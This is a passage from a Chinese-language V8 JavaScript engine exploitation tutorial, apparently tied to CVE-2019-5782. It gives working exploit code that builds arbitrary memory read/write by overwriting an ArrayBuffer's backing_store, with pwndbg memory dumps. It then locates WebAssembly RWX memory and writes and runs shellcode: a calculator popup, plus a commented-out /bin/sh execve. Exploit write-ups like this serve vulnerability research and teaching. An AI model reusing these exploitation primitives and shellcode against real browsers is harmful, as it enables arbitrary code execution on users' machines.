
# 任意读写

```javascript
/*---------------------------arbitrary read and write-------------------------*/

var buf = new ArrayBuffer(0xbeef);

var offset2;

var dtView = new DataView(buf);

%DebugPrint(buf)

%SystemBreak();



//search the buf.size

for(let i=0; i<0xffff; i++){

    if(dt.f2i(a2[i]) == 0xbeef){

        offset2 = i+1; //a2[offset2] -> buf.backing_store

        break;

    }

}



function write64(addr, value){

    a2[offset2] = dt.i2f(addr);//传入的addr和value都是整型，先要转换为浮点型，举个例子addr等于0xffff00000000(281470681743360)，转换为浮点型1.39064994160909e-309，最后在内存中存储的地址还是0xffff00000000(参考浮点数在内存中存储，前面讲了)。此时backing_store已经被赋值为目标地址

    dtView.setFloat64(0, dt.i2f(value), true);//可以对目标地址写了，i2f转换原理同上分析

}



function read64(addr, str=false){

    a2[offset2] = dt.i2f(addr);//backing_store已经被赋值为目标地址

    let tmp = ['', ''];

    let tmp2 = ['', ''];

    let result = '' //我们举个例子目标地址中存放的内容是0xFFFF00000000

    tmp[1] = hex(dtView.getUint32(0)).slice(10,);//"FFFF0000"，后面会 转换为"0000FFFF"

    tmp[0] = hex(dtView.getUint32(4)).slice(10,);//"0000000"

    for(let i=3; i>=0; i--){//大小端转换

        tmp2[0] += tmp[0].slice(i*2, i*2+2);

        tmp2[1] += tmp[1].slice(i*2, i*2+2);

    }

    result = tmp2[0]+tmp2[1] //"0000FFFF" + "00000000"

    if(str==true){return '0x'+result}

    else {return parseInt(result, 16)};//281470681743360(0xFFFF00000000)

}



//test

write64(addressOf(objTest)+0x18-1, 0xdeadbeef);

console.log('read in objTest+0x18 : ' + hex(read64(addressOf(objTest)+0x18-1)));
```

## gdb调试，打印ArrayBuffer的内存结构

```
DebugPrint: 0x176aac288e31: [JSArrayBuffer]

 - map: 0x02dee5902399 <Map(HOLEY_ELEMENTS)> [FastProperties]

 - prototype: 0x25367e30ea31 <Object map = 0x2dee59023e9>

 - elements: 0x3fda8cf80c21 <FixedArray[0]> [HOLEY_ELEMENTS]

 - embedder fields: 2

 - backing_store: 0x55efd4fc5b00 //ArrayBuffer是向这个地址读写数值

 - byte_length: 48879 //长度0xbeef

 - neuterable

 - properties: 0x3fda8cf80c21 <FixedArray[0]> {}

 - embedder fields = {

    0, aligned pointer: (nil)

    0, aligned pointer: (nil)

 }



pwndbg> telescope 0x176aac288e30

00:0000│   0x176aac288e30 —▸ 0x2dee5902399 ◂— 0x800003fda8cf801

01:0008│   0x176aac288e38 —▸ 0x3fda8cf80c21 ◂— 0x3fda8cf807

... ↓

03:0018│   0x176aac288e48 ◂— 0xbeef //ArrayBuffer长度0xbeef

04:0020│   0x176aac288e50 —▸ 0x55efd4fc5b00 ◂— 0x0 

05:0028│   0x176aac288e58 ◂— 0x2

06:0030│   0x176aac288e60 ◂— 0x0
```

`ArrayBuffer`读写数据是通过`backing_store`的。所以为了实现任意地址读写，我们通常是覆盖`ArrayBuffer`的`backing_store`为我们想要读写的地址。上面的代码中我们先获取了`ArrayBuffer`的长度`0xbeef`在`a2`中的偏移(`a2[偏移] == 0xbeef`)，由于`backing_store`正好在长度`0xbeef`的上面，所以偏移-1获得到了`backing_stored`在`a2`中的偏移，此时可以通过`a2`来操作`backing_store`了。具体的函数细节请参考代码中的注释。

# 5、利用WASM执行shellcode

详细的过程请参考[《CVE-2019-5782 v8数组越界 漏洞复现》](https://bbs.kanxue.com/elink@152K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2K6N6h3&6^5K9h3q4G2K9$3!0F1k6#2)9J5k6i4S2&6P5W2)9J5c8U0t1H3x3U0m8Q4x3X3b7H3x3W2)9J5k6o6t1#2i4K6u0r3L8s2A6^5i4K6u0V1j5%4k6W2i4K6u0V1x3U0l9I4z5g2)9J5k6o6f1%4z5o6u0Q4x3V1j5`.)，这里不重复说明了。

```javascript
/*-------------------------use wasm to execute shellcode------------------*/

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,

    127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,

    1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,

    0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,10,11]);

var wasmModule = new WebAssembly.Module(wasmCode);

var wasmInstance = new WebAssembly.Instance(wasmModule, {});

var funcAsm = wasmInstance.exports.main;



var addressFasm = addressOf(funcAsm);

var sharedInfo = read64(addressFasm+0x18-0x1);

var data = read64(sharedInfo+0x8-0x1);

var instance = read64(data+0x10-0x1);

var memoryRWX = (read64(instance+0xe8-0x1));

memoryRWX = Math.floor(memoryRWX);

console.log("[*] Get RWX memory : " + hex(memoryRWX));



// sys_execve('/bin/sh')

// var shellcode = [

//     '2fbb485299583b6a',

//     '5368732f6e69622f',

//     '050f5e5457525f54'

// ];



// pop up a calculator

var shellcode = [

    '636c6163782fb848',

    '73752fb848500000',

    '8948506e69622f72',

    '89485750c03148e7',

    '3ac0c748d23148e6',

    '4944b84850000030',

    '48503d59414c5053',

    '485250c03148e289',

    '00003bc0c748e289',

    '050f00'

];



//write shellcode into RWX memory

var offsetMem = 0;

for(x of shellcode){

    write64(memoryRWX+offsetMem, x);

    offsetMem+=8;

}

//call funcAsm() and it would execute shellcode actually

funcAsm();
```

我们先泄露了`funcAsm`的地址，然后使用任意地址读获取了`RXW`区域的地址，之后使用任意地址写向其中写入`shellcode`，最后调用`funcAsm`来调用`shellcode`，弹出计数器。

## 四、完整exp，去除debug信息
